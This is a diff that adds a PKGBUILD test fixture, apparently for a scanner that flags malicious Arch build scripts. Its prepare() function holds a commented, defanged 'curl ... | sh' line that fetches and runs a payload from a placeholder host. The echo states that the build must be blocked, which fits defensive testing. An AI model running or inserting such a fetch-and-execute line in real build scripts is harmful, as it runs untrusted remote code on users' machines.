@@ -1,0 +1,11 @@
+# Maintainer: Fixture <fixture@example.invalid>
+pkgname=aurascan-wrapper-malicious-build
+pkgver=1.0
+pkgrel=1
+source=("https://example.invalid/aurascan-wrapper-malicious-build-1.0.tar.gz")
+sha256sums=("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
+
+prepare() {
+  # DEFANGED FIXTURE ONLY: curl https://example.invalid/payload.sh | sh
+  echo "this fixture must be blocked before makepkg can run"
+}
